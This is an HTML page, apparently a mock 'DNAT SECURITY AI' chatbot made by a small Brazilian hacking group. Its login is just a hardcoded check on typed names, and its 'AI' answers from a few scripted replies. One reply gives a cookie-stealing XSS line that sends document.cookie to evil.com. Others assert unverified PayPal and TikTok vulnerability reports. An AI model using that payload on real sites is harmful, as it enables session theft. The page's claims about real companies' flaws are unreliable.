<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<title>DNAT SECURITY AI v2.1</title>
<style>
html,body{margin:0;background:#000;color:#0f0;font-family:monospace;min-height:100vh}
.header{text-align:center;padding:15px 0;position:sticky;top:0;background:#000;z-index:10;border-bottom:1px solid #0f0}
.header h1{margin:0;color:#0f0;text-shadow:0 0 10px #0f0;font-size:20px}
.box{width:90%;max-width:550px;margin:20px auto;border:1px solid #0f0;padding:15px;background:#050505;border-radius:6px}
input{width:95%;background:#000;color:#0f0;border:1px solid #0f0;padding:10px;margin:5px 0;border-radius:4px}
button{width:100%;background:#0f0;color:#000;padding:12px;border:none;border-radius:4px;font-weight:bold;cursor:pointer;margin-top:10px}
#chatArea{display:none;margin-top:20px;border-top:1px dashed #0f0;padding-top:15px}
.msg{margin:8px 0;padding:8px;border-radius:4px;font-size:13px;white-space:pre-wrap}
.user{background:#0f0;color:#000;text-align:right}
.ai{background:#111;border:1px solid #0f0;color:#0f0}
#log{width:90%;max-width:650px;margin:10px auto;color:#0a0;font-size:11px;white-space:pre-wrap;word-break:break-all}
</style>
</head>
<body>
<div class="header">
<h1>DNAT SECURITY AI</h1>
<div style="font-size:11px">Desenvolvida por Thfwck00, Andre unic, Note e Pis3i - THE BEST SQUAD 2026</div>
</div>

<div class="box" id="loginBox">
<div>$ init dnat-ai --ethical-mode<br>name is pentester:</div>
<input id="nameInput" placeholder="Andre unic ou Thfwck00" autocomplete="off">
<div id="statusBox" style="margin-top:10px;padding:8px;background:#111;border:1px solid #333;font-size:12px;min-height:40px"></div>
<button id="enterBtn">ENTER SYSTEM</button>
</div>

<div class="box" id="chatArea">
<div style="color:#0f0;font-weight:bold">[DNAT AI] Online - Chat Liberado 🔓</div>
<div id="chatBox" style="max-height:350px;overflow:auto;margin:15px 0;border:1px solid #222;padding:10px;min-height:100px"></div>
<input id="chatInput" placeholder="Digite: analisa paypal">
<button id="sendBtn">ENVIAR PARA IA</button>
</div>

<div id="log"></div>

<script>
const founders=["Thfwck00","Note","Pis3i","Thfack00","Thck00"];
const verified={"Andre unic":["4113932","4113594","4113379"],"André unic":["4113932","4113594","4113379"]};
let current=null;

function updateStatus(name){
 const box=document.getElementById('statusBox');
 if(founders.includes(name)){
  box.innerHTML=`<span style="color:#0f0">FOUNDER - THE BEST SQUAD<br>${name} - Acesso total</span><br><br>FOUNDER Verified: ${name}`;
  return true;
 }else if(verified[name]){
  let r=verified[name];
  box.innerHTML=`Report #${r[0]} successfully submitted<br>[paypal] #${r[1]} Subdomain Takeover<br>[tiktok] #${r[2]} Unauthenticated<br><br>Verified Researcher: ${name} - ${r.length} reports<br>FOUNDER Verified: ${name}`;
  return true;
 }else{
  box.innerHTML=`Visitante: ${name}<br>Visitante`;
  return false;
 }
}

document.getElementById('nameInput').addEventListener('input',e=>{updateStatus(e.target.value.trim())});
document.getElementById('enterBtn').addEventListener('click',()=>{
 let name=document.getElementById('nameInput').value.trim();
 if(!name) return;
 let ok=founders.includes(name)||verified[name];
 document.getElementById('log').innerText+=`\n[${new Date().toLocaleTimeString()}] [DNAT] ${name} autenticado - Reports 4113932, 4113594, 4113379 TikTok\n[DNAT SECURITY AI] Online - ${name}\n`;
 if(ok){
  current=name;
  document.getElementById('chatArea').style.display='block';
  document.getElementById('chatBox').innerHTML+=`<div class="msg ai">[DNAT AI] Fala ${name}! Sou a DNAT AI. Pergunta sobre paypal, tiktok, ou pede pra gerar payload.</div>`;
  window.scrollTo(0,document.body.scrollHeight);
  document.getElementById('chatInput').focus();
 } else {
  alert('Digite Andre unic ou Thfwck00 pra liberar o chat!');
 }
});

function aiReply(q){
 q=q.toLowerCase();
 if(q.includes('paypal')) return `[DNAT AI] Report #4113594 PayPal:\n> Subdomain Takeover em shop.paypal.com\n> CNAME -> bucket S3 não reclamado\n> PoC: dig shop.paypal.com + curl -I\n> Impacto: Alto. Quer template pro HackerOne?`;
 if(q.includes('tiktok')) return `[DNAT AI] Report #4113379 TikTok:\n> /api/user/email sem auth\n> IDOR vaza email de qualquer user\n> Já tá Triaged. Quer que eu escreva o report?`;
 if(q.includes('payload')||q.includes('poc')) return `[DNAT AI] Payload pronto:\nfetch('https://evil.com?c='+document.cookie)\nUse em XSS no subdomain takeover. Ético apenas com autorização!`;
 return `[DNAT AI] Entendi: "${q}"\n> Posso analisar teus reports, gerar PoC, e escrever template HackerOne.\n> Tenta: "analisa paypal"`;
}

document.getElementById('sendBtn').addEventListener('click',send);
document.getElementById('chatInput').addEventListener('keydown',e=>{if(e.key==='Enter') send()});
function send(){
 let q=document.getElementById('chatInput').value.trim(); if(!q) return;
 let box=document.getElementById('chatBox');
 let u=document.createElement('div'); u.className='msg user'; u.innerText=q; box.appendChild(u);
 let a=document.createElement('div'); a.className='msg ai'; a.innerText='[DNAT AI] digitando...'; box.appendChild(a);
 box.scrollTop=box.scrollHeight;
 setTimeout(()=>{a.innerText=aiReply(q); box.scrollTop=box.scrollHeight;},600);
 document.getElementById('chatInput').value='';
}
</script>
</body>
</html>
